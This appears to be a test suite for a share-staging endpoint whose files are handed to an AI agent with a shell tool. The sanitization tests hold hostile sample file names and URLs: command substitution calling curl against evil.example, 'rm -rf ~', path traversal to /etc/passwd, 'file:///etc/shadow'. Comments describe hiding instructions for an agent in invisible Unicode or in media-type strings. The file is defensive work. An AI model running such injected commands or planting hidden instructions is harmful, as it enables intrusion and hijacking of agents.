import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdir, readdir, readFile, rm, utimes } from "node:fs/promises";
import { join } from "node:path";
import {
  SHARE_MAX_FILES,
  SHARE_MAX_STAGED,
  SHARE_MAX_FILE_BYTES,
  SHARE_MAX_TEXT_BYTES,
  SHARE_STAGING_DIR,
  SHARE_STAGING_TTL_MS,
} from "@schlessera/brain-ui-sdk/protocol";
import { shareRoutes } from "../src/routes/share";
import {
  ShareTooLargeError,
  pruneShareStaging,
  sanitizeFileName,
  shareStagingRoot,
  stageShare,
} from "../src/share/staging";

const BRAIN_ROOT = `/tmp/brain-ui-share-${process.pid}`;
let previousBrainPath: string | undefined;

beforeEach(async () => {
  previousBrainPath = process.env.BRAIN_PATH;
  process.env.BRAIN_PATH = BRAIN_ROOT;
  await rm(BRAIN_ROOT, { recursive: true, force: true });
  await mkdir(BRAIN_ROOT, { recursive: true });
});

afterEach(async () => {
  await rm(BRAIN_ROOT, { recursive: true, force: true });
  if (previousBrainPath === undefined) delete process.env.BRAIN_PATH;
  else process.env.BRAIN_PATH = previousBrainPath;
});

function post(form: FormData) {
  return shareRoutes.request("/share", { method: "POST", body: form });
}

function textFile(name: string, body: string, type = "text/plain"): File {
  return new File([body], name, { type });
}

async function readManifest(dir: string) {
  return JSON.parse(
    await readFile(join(BRAIN_ROOT, dir, "meta.json"), "utf-8")
  ) as Record<string, unknown>;
}

describe("POST /api/share", () => {
  test("stages a text + url share and writes meta.json", async () => {
    const form = new FormData();
    form.set("title", "A page");
    form.set("text", "Something worth keeping");
    form.set("url", "https://example.com/post");

    const response = await post(form);
    const body = await response.json();

    expect(response.status).toBe(201);
    expect(body.dir.startsWith(`${SHARE_STAGING_DIR}/`)).toBe(true);
    expect(body.files).toEqual([]);
    expect(body.title).toBe("A page");
    expect(body.url).toBe("https://example.com/post");
    // The manifest carries the provenance; the HTTP answer has no use for it.
    expect(body.source).toBeUndefined();

    const manifest = await readManifest(body.dir);
    expect(manifest.source).toBe("web-share-target");
    expect(manifest.text).toBe("Something worth keeping");
    expect(manifest.id).toBe(body.id);
  });

  test("stages files under the staging dir with their bytes intact", async () => {
    const form = new FormData();
    form.append("files", textFile("notes.md", "# hello", "text/markdown"));

    const response = await post(form);
    const body = await response.json();

    expect(response.status).toBe(201);
    expect(body.files).toHaveLength(1);
    expect(body.files[0]).toMatchObject({
      name: "notes.md",
      mediaType: "text/markdown",
      bytes: 7,
      path: `${body.dir}/notes.md`,
    });
    expect(await readFile(join(BRAIN_ROOT, body.files[0].path), "utf-8")).toBe(
      "# hello"
    );
  });

  test("a traversing file name cannot leave the staging dir", async () => {
    const form = new FormData();
    form.append("files", textFile("../../../etc/passwd", "nope"));

    const body = await (await post(form)).json();

    expect(body.files[0].name).toBe("passwd");
    expect(body.files[0].path).toBe(`${body.dir}/passwd`);
    const staged = await readdir(join(BRAIN_ROOT, body.dir));
    expect(staged.sort()).toEqual(["meta.json", "passwd"]);
  });

  test("a shared file called meta.json does not clobber the manifest", async () => {
    const form = new FormData();
    form.append("files", textFile("meta.json", '{"evil":true}', "application/json"));

    const body = await (await post(form)).json();

    expect(body.files[0].name).toBe("meta-2.json");
    const manifest = await readManifest(body.dir);
    expect(manifest.source).toBe("web-share-target");
  });

  test("a differently-cased meta.json is still kept off the manifest", async () => {
    // On a case-insensitive filesystem (macOS, Windows) META.JSON and meta.json
    // are one file: a case-sensitive reservation would let one overwrite the
    // other and leave the manifest describing a file that no longer exists.
    const form = new FormData();
    form.append("files", textFile("META.JSON", '{"evil":true}', "application/json"));
    form.append("files", textFile("Photo.JPG", "one", "image/jpeg"));
    form.append("files", textFile("photo.jpg", "two", "image/jpeg"));

    const body = await (await post(form)).json();

    const names = body.files.map((f: { name: string }) => f.name);
    // The extension is normalized to lower case; the stem keeps its casing.
    expect(names[0]).toBe("META-2.json");
    expect(new Set(names.map((n: string) => n.toLowerCase())).size).toBe(3);
  });

  test("colliding names are suffixed rather than overwritten", async () => {
    const form = new FormData();
    form.append("files", textFile("photo.jpg", "one", "image/jpeg"));
    form.append("files", textFile("photo.jpg", "two", "image/jpeg"));

    const body = await (await post(form)).json();

    expect(body.files.map((f: { name: string }) => f.name)).toEqual([
      "photo.jpg",
      "photo-2.jpg",
    ]);
    expect(await readFile(join(BRAIN_ROOT, body.files[1].path), "utf-8")).toBe(
      "two"
    );
  });

  test("empty parts are ignored, and a share with nothing in it is refused", async () => {
    const form = new FormData();
    form.append("files", new File([], "empty.txt", { type: "text/plain" }));

    const response = await post(form);

    expect(response.status).toBe(400);
    expect(await response.json()).toEqual({ error: "empty_share" });
  });

  test("too many files is refused with the limit", async () => {
    const form = new FormData();
    for (let n = 0; n <= SHARE_MAX_FILES; n += 1) {
      form.append("files", textFile(`f${n}.txt`, "x"));
    }

    const response = await post(form);

    expect(response.status).toBe(413);
    expect(await response.json()).toEqual({
      error: "too_many_files",
      limit: SHARE_MAX_FILES,
    });
  });

  test("oversize text is refused before anything is written", async () => {
    const form = new FormData();
    form.set("text", "x".repeat(SHARE_MAX_TEXT_BYTES + 1));

    const response = await post(form);

    expect(response.status).toBe(413);
    expect(await response.json()).toEqual({
      error: "text_too_large",
      limit: SHARE_MAX_TEXT_BYTES,
    });
    await expect(readdir(shareStagingRoot())).rejects.toThrow();
  });

  test("a body with no content-length is still capped while streaming", async () => {
    // Chunked / HTTP2 requests carry no content-length, so the header check is
    // not a defense: the cap has to be counted off the stream.
    const megabyte = new Uint8Array(1024 * 1024);
    let sent = 0;
    const body = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (sent >= 60) {
          controller.close();
          return;
        }
        sent += 1;
        controller.enqueue(megabyte);
      },
    });

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "content-type": "multipart/form-data; boundary=abc" },
      body,
      // @ts-expect-error -- required by fetch for a streamed body, absent from the DOM types
      duplex: "half",
    });

    expect(response.status).toBe(413);
    expect((await response.json()).error).toBe("share_too_large");
    // The stream was abandoned, not drained.
    expect(sent).toBeLessThan(60);
  });

  test("a cross-site POST is refused even with a valid session", async () => {
    // A multipart POST is CORS-simple, so it arrives with no preflight, and in
    // tailscale mode the credential is the source IP rather than a cookie.
    // Only the app itself ever calls this route.
    const form = new FormData();
    form.set("text", "injected");

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "sec-fetch-site": "cross-site" },
      body: form,
    });

    expect(response.status).toBe(403);
    expect((await response.json()).error).toBe("cross_origin_rejected");
    await expect(readdir(shareStagingRoot())).rejects.toThrow();
  });

  test("a same-origin POST from the app is accepted", async () => {
    const form = new FormData();
    form.set("text", "from the app");

    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "sec-fetch-site": "same-origin" },
      body: form,
    });

    expect(response.status).toBe(201);
  });

  test("a declared content-length over the cap is refused before parsing", async () => {
    const response = await shareRoutes.request("/share", {
      method: "POST",
      headers: { "content-length": String(10 ** 9) },
      body: new FormData(),
    });

    expect(response.status).toBe(413);
    expect((await response.json()).error).toBe("share_too_large");
  });
});

describe("share staging", () => {
  test("sanitizeFileName strips control characters and separators", () => {
    expect(sanitizeFileName("pho\u0000to:1.jpg", "image/jpeg")).toBe("photo-1.jpg");
    expect(sanitizeFileName("dir/sub\\shot.PNG", "image/png")).toBe("shot.png");
    expect(sanitizeFileName("", "application/pdf")).toBe("file.pdf");
    expect(sanitizeFileName("...", "text/plain")).toBe("file.txt");
  });

  test("no shell metacharacter survives a file name", () => {
    // The consumer is an agent with a Bash tool. Correct quoting by the agent
    // is not a security boundary, so the name it is handed must be inert.
    const hostile = [
      "x$(curl evil.example).jpg",
      "`whoami`.txt",
      "a;rm -rf ~.txt",
      "a|b>c<d&e.png",
      "'quoted' \"double\".pdf",
      "new\nline.txt",
    ];
    for (const raw of hostile) {
      const name = sanitizeFileName(raw, "text/plain");
      expect(name).toMatch(/^[\p{L}\p{N}\p{M}._-]+$/u);
      expect(name.startsWith("-")).toBe(false);
      expect(name.startsWith(".")).toBe(false);
    }
  });

  test("invisible characters cannot ride in on a name or on text", () => {
    // Bidi overrides, zero-width characters and the Unicode tag block are the
    // standard channel for hiding instructions from a human while leaving them
    // in the model's tokens.
    const rlo = "photo" + "\u202E" + "gnp.exe";
    const tagged = "note" + "\u200B" + "s" + "\u{E0041}" + ".txt";
    expect(sanitizeFileName(rlo, "image/png")).toBe("photognp.exe");
    expect(sanitizeFileName(tagged, "text/plain")).toBe("notes.txt");
  });

  test("a name that is only forbidden characters still becomes a file", () => {
    expect(sanitizeFileName("$$$", "image/jpeg")).toBe("file.jpg");
    expect(sanitizeFileName("-----", "text/plain")).toBe("file.txt");
  });

  test("a CJK name survives as itself", () => {
    // The allowlist keeps Unicode letters: sanitizing must not mean ASCII-only.
    expect(sanitizeFileName("\u8a18\u4e8b.md", "text/markdown")).toBe("\u8a18\u4e8b.md");
  });

  test("a leading dot cannot make a staged file hidden", () => {
    expect(sanitizeFileName(".env", "text/plain")).toBe("env.txt");
  });

  test("an extensionless name takes its extension from the media type", () => {
    expect(sanitizeFileName("scan", "application/pdf")).toBe("scan.pdf");
    expect(sanitizeFileName("blob", "application/x-thing")).toBe("blob");
  });

  test("a long name is bounded by BYTES and keeps its extension", () => {
    const ascii = sanitizeFileName(`${"a".repeat(400)}.jpg`, "image/jpeg");
    expect(Buffer.byteLength(ascii, "utf-8")).toBeLessThanOrEqual(100);
    expect(ascii.endsWith(".jpg")).toBe(true);

    // Three bytes per character: counting characters would produce a name the
    // filesystem refuses with ENAMETOOLONG.
    const cjk = sanitizeFileName(`${"\u8a18".repeat(200)}.jpg`, "image/jpeg");
    expect(Buffer.byteLength(cjk, "utf-8")).toBeLessThanOrEqual(100);
    expect(cjk.endsWith(".jpg")).toBe(true);

    // And no surrogate pair is cut in half.
    const emoji = sanitizeFileName(`${"\u{1f4a1}".repeat(100)}.png`, "image/png");
    expect(Buffer.byteLength(emoji, "utf-8")).toBeLessThanOrEqual(100);
    expect(emoji.includes("\ufffd")).toBe(false);
  });

  test("a part that lies about its size is caught on the decoded bytes", async () => {
    const oversized = new Uint8Array(SHARE_MAX_FILE_BYTES + 1);
    const liar = {
      name: "small.bin",
      type: "application/octet-stream",
      size: 12,
      arrayBuffer: async () => oversized.buffer,
    } as unknown as File;

    await expect(stageShare({ files: [liar] })).rejects.toBeInstanceOf(
      ShareTooLargeError
    );
    // The half-written directory is removed, not left for the agent to read.
    await expect(readdir(shareStagingRoot())).resolves.toEqual([]);
  });

  test("a share is only visible once it is whole", async () => {
    // Staged into `.<id>.partial` and renamed into place after meta.json, so a
    // crash mid-write cannot leave the agent a share with missing files.
    const result = await stageShare({ text: "atomic", files: [] });
    const entries = await readdir(shareStagingRoot());

    expect(entries).toEqual([result.id]);
    expect(entries.some((e) => e.includes("partial"))).toBe(false);
  });

  test("a url the agent must not dereference is demoted to text", async () => {
    // The filing skill fetches this field. Anything but http(s) — javascript:,
    // data:, file:///etc/shadow, the cloud metadata address over a bogus scheme
    // — becomes plain text instead.
    for (const hostile of ["javascript:alert(1)", "file:///etc/shadow", "data:text/html,x"]) {
      const result = await stageShare({ url: hostile, files: [] });
      expect(result.url).toBeUndefined();
      expect(result.text).toContain(hostile);
    }

    const ok = await stageShare({ url: "https://example.com/post", files: [] });
    expect(ok.url).toBe("https://example.com/post");
  });

  test("an absurd media type is replaced, not quoted back", async () => {
    // It is interpolated into the agent's prompt beside the file name, so an
    // unbounded attacker string there is a place to hide a paragraph.
    const file = new File(["x"], "note.txt", { type: "text/plain" });
    Object.defineProperty(file, "type", { value: "a/".padEnd(505, "b") });

    const result = await stageShare({ files: [file] });

    expect(result.files[0]!.mediaType).toBe("application/octet-stream");
  });

  test("the inbox refuses to grow without bound", async () => {
    for (let n = 0; n < SHARE_MAX_STAGED; n += 1) {
      await mkdir(join(shareStagingRoot(), `share-${n}`), { recursive: true });
    }

    await expect(stageShare({ text: "one too many", files: [] })).rejects.toMatchObject({
      reason: "inbox_full",
    });
  });

  test("the total-size cap is enforced across files, not just per file", async () => {
    // Each part is under the per-file cap; together they are over the share cap.
    const chunk = new Uint8Array(8);
    const liar = (name: string) =>
      ({
        name,
        type: "application/octet-stream",
        size: 20_000_000,
        arrayBuffer: async () => chunk.buffer,
      }) as unknown as File;

    await expect(
      stageShare({ files: [liar("a.bin"), liar("b.bin"), liar("c.bin")] })
    ).rejects.toMatchObject({ reason: "share_too_large" });
  });

  test("pruneShareStaging sweeps orphaned partial directories sooner", async () => {
    const partial = join(shareStagingRoot(), ".abc.partial");
    await mkdir(partial, { recursive: true });
    const anHourAgo = new Date(Date.now() - 2 * 60 * 60 * 1000);
    await utimes(partial, anHourAgo, anHourAgo);

    expect(await pruneShareStaging()).toBe(1);
    expect(await readdir(shareStagingRoot())).toEqual([]);
  });

  test("pruneShareStaging removes expired shares and keeps fresh ones", async () => {
    const fresh = await stageShare({ text: "keep me", files: [] });
    const stale = await stageShare({ text: "sweep me", files: [] });

    const staleDir = join(BRAIN_ROOT, stale.dir);
    const expired = new Date(Date.now() - SHARE_STAGING_TTL_MS - 60_000);
    await utimes(staleDir, expired, expired);

    expect(await pruneShareStaging()).toBe(1);
    expect(await readdir(shareStagingRoot())).toEqual([fresh.id]);
  });

  test("pruneShareStaging is a no-op when nothing has been staged", async () => {
    expect(await pruneShareStaging()).toBe(0);
  });
});
